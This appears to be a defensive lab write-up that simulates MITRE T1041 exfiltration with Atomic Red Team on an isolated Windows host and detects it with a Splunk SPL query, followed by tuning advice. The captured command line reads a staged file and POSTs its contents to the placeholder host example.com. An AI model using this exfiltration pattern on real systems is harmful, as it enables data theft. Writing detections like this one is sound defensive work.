# T1041 — Exfiltration Over C2 Channel

**Tactic:** Exfiltration  **Technique:** T1041  **Log Source:** Sysmon (XmlWinEventLog) — Process Creation

## What This Attack Does

After collecting and staging data, an attacker sends it out of the network using
the same channel they use to control the compromised machine (their
command-and-control, or C2, connection). Rather than opening a separate
connection just for stealing data, blending exfiltration into existing C2
traffic makes it harder for defenders to spot — it looks like normal beacon
traffic rather than a distinct data transfer.

## How I Simulated It

Tool: Atomic Red Team
Command executed on the Windows Server target (192.168.56.102):

    Invoke-AtomicTest T1041 -TestNumbers 1

Note: The test stages a text file, then attempts to POST its contents to a
placeholder domain (`example.com`), which failed to resolve since this lab has
no internet access on the Windows host. The exfiltration attempt was still fully
generated and logged before failing at the network level — the same outcome a
real attacker would see if their C2 domain were sinkholed, blocked, or
unreachable.

## What Splunk Captured

Sysmon Event ID 1 (Process Creation) fired once, capturing the full PowerShell
script used to stage and attempt exfiltration:
- Image: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
- User: `WINDOWS\khaled`
- ParentImage: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
- CommandLine (key portion): stages `$env:TEMP\LineNumbers.txt`, reads it with
  `Get-Content`, then `Invoke-WebRequest -Uri example.com -Method POST -Body
  $filecontent -DisableKeepAlive`

## SPL Detection Query

```spl
index=* sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" "Invoke-WebRequest" "POST"
| rex field=_raw "Name='Image'>(?P<Image>[^<]+)"
| rex field=_raw "Name='CommandLine'>(?P<CommandLine>[^<]+)"
| rex field=_raw "Name='ParentImage'>(?P<ParentImage>[^<]+)"
| rex field=_raw "Name='User'>(?P<User>[^<]+)"
| rex field=_raw "Name='UtcTime'>(?P<UtcTime>[^<]+)"
| table UtcTime, User, Image, CommandLine, ParentImage
```

## Detection Logic

The query keys on `Invoke-WebRequest` combined with `POST` in the command line —
the signature of PowerShell pushing data *out* rather than pulling it in. A GET
is normal for downloads; a POST carrying `$filecontent` read from a staged file
is the exfil tell. Because the whole script lands in one process-creation event,
the CommandLine alone shows the full staging-and-send logic, including the
destination URI, without needing network logs.

## False Positives / Tuning

Legitimate automation and admin scripts use `Invoke-WebRequest -Method POST`
(API calls, webhooks, telemetry), so this fires on benign activity too. Tune by:
flagging POSTs whose body is sourced from `Get-Content` / file reads, unusual
destination domains (raw IPs, newly-seen hosts, non-corporate TLDs), or an
unusual parent process. Correlating with a preceding Collection/Archive step
(T1560) from the same host in a short window sharply raises confidence that this
is real exfiltration rather than a routine API call.

## Result

Splunk detected the exfiltration attempt, capturing the full PowerShell logic
used to read staged data and POST it out via `Invoke-WebRequest`. The outbound
request failed to resolve at the DNS level (no internet, placeholder domain), but
the attempt was fully visible in process-creation logs — proof that even failed
exfiltration leaves a clear forensic trail.

## Screenshots

**Attack executed on Windows Server target (POST to example.com fails to resolve):**
<img width="873" alt="T1041 exfiltration test executed on Windows Server" src="https://github.com/user-attachments/assets/7b6c2893-02db-47c7-9df4-89e89ac306fa" />

**Detection in Splunk — Invoke-WebRequest POST captured in one event:**
<img width="1912" alt="T1041 detection in Splunk showing Invoke-WebRequest POST" src="https://github.com/user-attachments/assets/e71d3aaa-7205-46d0-a0cb-147e9a1d7868" />
